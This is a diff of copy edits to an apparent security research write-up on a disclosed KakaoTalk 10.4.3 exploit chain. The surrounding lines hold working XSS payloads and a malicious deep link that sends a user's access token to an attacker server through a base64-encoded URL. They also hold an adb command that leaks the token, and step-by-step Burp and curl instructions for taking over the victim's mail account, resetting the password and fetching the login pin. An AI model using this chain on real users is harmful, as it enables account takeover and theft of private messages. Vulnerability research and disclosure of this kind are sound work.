@@ -34,7 +34,7 @@ A deep link validation issue in KakaoTalk `10.4.3` allows a remote adversary to 
 
 ## Context
 
-With more than 100 million downloads from the Google Playstore, KakaoTalk is South Korea's most popular chat app. Similar to other Asian apps such as WeChat, KakaoTalk is an "all-in" app including everyhing into one app (payment, ride-hailing services, shopping, e-mail, etc.). End-to-end encrypted (E2EE) messaging is not enabled per default in KakaoTalk. Regular chatrooms, where Kakao Corp. can access messages in transit, is the preferred way for many users. KakaoTalk does have an opt-in E2EE feature called "Secure Chat" but it doesn't support features such as group messaging or voice calling.
+With more than 100 million downloads from the Google Playstore, KakaoTalk is South Korea's most popular chat app. Similar to apps such as WeChat, KakaoTalk is an "all-in" app including everyhing into one app (payment, ride-hailing services, shopping, e-mail, etc.). End-to-end encrypted (E2EE) messaging is not enabled per default in KakaoTalk. Regular chatrooms, where Kakao Corp. can access messages in transit, is the preferred way for many users. KakaoTalk does have an opt-in E2EE feature called "Secure Chat" but it doesn't support features such as group messaging or voice calling.
 
 ## Entry Point: CommerceBuyActivity
 
@@ -100,11 +100,11 @@ Maybe there's an Open Redirect or XSS issue on `https://buy.kakao.com` so that w
 
 ## URL Redirect to DOM XSS
 
-While digging into https://buy.kakao.com we identified the endpoint https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl= which allowed to redirect to any `kakao.com` domain. This vastly increased our chances to find a XSS flaw as there are many many subdomains under `kakao.com`.
+While digging into `https://buy.kakao.com` we identified the endpoint `https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=` which allowed to redirect to any `kakao.com` domain. This vastly increased our chances to find a XSS flaw as there are many many subdomains under `kakao.com`.
 
-To find a vulnerable website we just googled for `site:*.kakao.com inurl:search -site:developers.kakao.com -site:devtalk.kakao.com` and found https://m.shoppinghow.kakao.com/m/search/q/yyqw6t29. The string `yyqw6t29` looked like a [DOM Invader canary](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary) to us, so we investigated further. 
+To find a vulnerable website we just googled for `site:*.kakao.com inurl:search -site:developers.kakao.com -site:devtalk.kakao.com` and found `https://m.shoppinghow.kakao.com/m/search/q/yyqw6t29`. The string `yyqw6t29` looked like a [DOM Invader canary](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary) to us, so we investigated further. 
 
-Funny enough, there was already a Stored XSS as https://m.shoppinghow.kakao.com/m/search/q/alert(1) popped up an alert box. Searching the DOM brought up the responsible Stored XSS payload `[해외]test "><svg/onload=alert(1);// Pullover Hoodie`. **Edit:** As of May 2024 this seems to be fixed.
+Funnily enough, there was already a Stored XSS as `https://m.shoppinghow.kakao.com/m/search/q/alert(1)` popped up an alert box. Searching the DOM brought up the responsible Stored XSS payload `[해외]test "><svg/onload=alert(1);// Pullover Hoodie`. **Edit:** As of May 2024 this seems to be fixed.
 
 Continuing to browse the DOM we discovered another [endpoint](https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:foo) where the search query was passed to a `innerHTML` sink (see [DOM Invader notes](#dom-xss)). Eventually, the PoC XSS payload turned out to be as simple as `"><img src=x onerror=alert(1);>`.
 
@@ -116,7 +116,7 @@ Since the `CommerceBuyActivity` supports the `intent://` scheme we could now sta
 
 Digging further, we identified the non-exported `MyProfileSettingsActivity` WebView which had a couple of issues, too.
 
-First of, it allowed to load arbitrary URLs:
+First off, it allowed loading of arbitrary URLs:
 
 ```java
 public final void onCreate(Bundle bundle) {
@@ -171,13 +171,13 @@ public final void onCreate(Bundle bundle) {
 
 This included `javascript://` and `data://` schemes which allow to run JavaScript. Also, it supported `content://` URLs, so a URL such as `content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json` opens KakaoTalk's Firebase Installation configuration in the `MyProfileSettingsActivity` WebView.
 
-Last but not least, it leaked an access token in the `Authorization` HTTP header. For example, a command such as `adb shell am start "intent:#Intent\;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity\;S.EXTRA_URL=https://foo.bar\;end"` would send the token to `https://foo.bar`.
+Additionally, it leaked an access token in the `Authorization` HTTP header. For example, a command such as `adb shell am start "intent:#Intent\;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity\;S.EXTRA_URL=https://foo.bar\;end"` would send the token to `https://foo.bar`.
 
-What could we do with this token? Maybe taking over a victim's KakaoTalk account?
+What could we do with this token? Maybe take over a victim's KakaoTalk account?
 
 ## Deep Link to Kakao Mail Account Takeover
 
-As explained in the previous section the `MyProfileSettingsActivity` is not exported, but we could start it via `CommerceBuyActivity` with the trick explained above. By crafting a malicious deep link we could send the access token to an attacker-controlled server:
+As explained in the previous section the `MyProfileSettingsActivity` is not exported, but we could start it via `CommerceBuyActivity` with the trick explained above. By crafting a malicious deep link, we could send the access token to an attacker-controlled server:
 
 ```
 kakaotalk://buy/auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUvZm9vLmh0bWw=');">
@@ -190,7 +190,7 @@ Let's break it down:
 - `https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:` had the XSS issue
 - `"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUvZm9vLmh0bWw=');">` is the XSS payload. We had to Base64 encode the "attacker URL" to bypass some sanitization checks.
 
-Now, in possession of the access token what could we do with it? Well, what about using it to take over the victim's Kakao Mail account that was used for KakaoTalk registration!
+Now, in possession of the access token what could we do with it? Well, how about we use it to take over the victim's Kakao Mail account that was used for KakaoTalk registration!
 
 > **_NOTE:_** If the victim doesn't have a Kakao Mail account it's possible to create a new Kakao Mail account on her/his behalf. This is interesting because creating a new Kakao Mail account overwrites the user's previous registered email-address with no additional checks. Scroll to the end of this section to check out how to do that.
 
@@ -241,10 +241,10 @@ Sec-Fetch-Dest: document
 Accept-Encoding: gzip, deflate, br
 Accept-Language: en-US,en;q=0.9
 ```
-4. Click on `Send` and confirm the target details
+4. Click on `Send` and confirm the target's details
 5. Right-click in the request window, select `Request in browser > In original session` and copy the URL into Burp's browser.
 
-As pointed out above we could also create a new Kakao Mail account on the user's behalf. Just repeat the same steps with Burp using the following HTTP request (adapt the `Authorization` header):
+If necessary, we could also create a new Kakao Mail account on the user's behalf. Just repeat the same steps with Burp using the following HTTP request (adapt the `Authorization` header):
 
 ```
 GET /kakao_mail/main?continue=https://talk.mail.kakao.com HTTP/1.1
@@ -270,7 +270,7 @@ When creating a new email address tick the box `Set As Primary Email`.
 
 ## KakaoTalk Password Reset with Burp
 
-Since we could now access the victim's Kakao Mail account a password reset was the next logical step. The only additional information required were the victim's email address, nickname and phone number which we got with the same curl query that we used above:
+With access to the victim's Kakao Mail account, a password reset was the next logical step. The only additional information required were the victim's email address, nickname and phone number which we got with the same curl query that we used above:
 
 ```bash
 curl -i -s -k -X $'GET' \
@@ -303,9 +303,9 @@ Changing the password via `https://accounts.kakao.com` turned out to be a bit co
 ```
 5. Disable `Intercept` in Burp and go back to Burp's browser. Click on `Using email address`.
 6. Enter the victim's nickname and email address on the next page and click the `Verify` button.
-7. Open a new browser tab and paste the Burp Repeater URL to access the user's Kakao Mail account (as described in the [previous](#deep-link-to-kakao-mail-account-takeover) section). If there's a message "session expired" just clear the browser's cache.
+7. Open a new browser tab and paste the Burp Repeater URL to access the user's Kakao Mail account (as described in the [previous](#deep-link-to-kakao-mail-account-takeover) section). If the message `session expired` shows up, clear the browser's cache.
 8. Grab the verification code from the email and enter it to proceed to the next page.
-9. On the page `Additional user verification will proceed to protect your Kakao Account.`, enable `Intercept` in Burp again, enter some values and click `Confirm`. Back in Burp when you see a POST request to `/kakao_accounts/check_phone_number.json`, adjust the `iso_code` and `phone_number` (without country code) parameters in the request body. Forward the request and disable the `Intercept` option again.
+9. On the page `Additional user verification will proceed to protect your Kakao Account.`, enable `Intercept` in Burp again. Enter some values and click `Confirm`. Back in Burp when you see a POST request to `/kakao_accounts/check_phone_number.json`, adjust the `iso_code` and `phone_number` (without country code) parameters in the request body. Forward the request and disable the `Intercept` option again.
 10. Finally, you can enter the new password.
 
 ## PoC
@@ -360,7 +360,7 @@ Next, the attacker can now reset her/his KakaoTalk password (see instructions [a
 
 When logging into KakaoTalk for Windows/MacOS or KiwiTalk with the victim's credentials a second authentication factor is required. It's a simple 4-digit pin which is either displayed in the PC version and needs to be entered in the KakaoTalk mobile app or the other way around (i.e., pin is sent to mobile app and needs to be entered in PC app).
 
-Unfortunately, the pin can't be brute-forced as there's some rate limiting going on at the endpoints https://talk-pilsner.kakao.com/talk-public/account/passcodeLogin/authorize and https://katalk.kakao.com/win32/account/register_device.json (blocked after 5 attempts).
+Unfortunately, the pin can't be brute-forced as there's some rate limiting going on at the endpoints `https://talk-pilsner.kakao.com/talk-public/account/passcodeLogin/authorize` and `https://katalk.kakao.com/win32/account/register_device.json` (blocked after 5 attempts).
 
 Luckily, we can still use the gathered access token to post/get the pin number to/from the KakaoTalk backend:
 
@@ -402,7 +402,7 @@ And we're in! Profit 🥳🥳🥳
 ## Takeaways
 
 1) There are still popular chat apps that don't require a very complex exploit chain to steal users' messages.
-2) If app developers make a couple of simple mistakes, Android's strong security model and message encryption don't help.
+2) If app developers make a couple of simple mistakes, Android's strong security model and message encryption won't help.
 3) Asian chat apps are still underrepresented in the security research community. I hope this blog post will encourage fellow researchers to dig into those apps.
 
 ## Responsible Disclosure
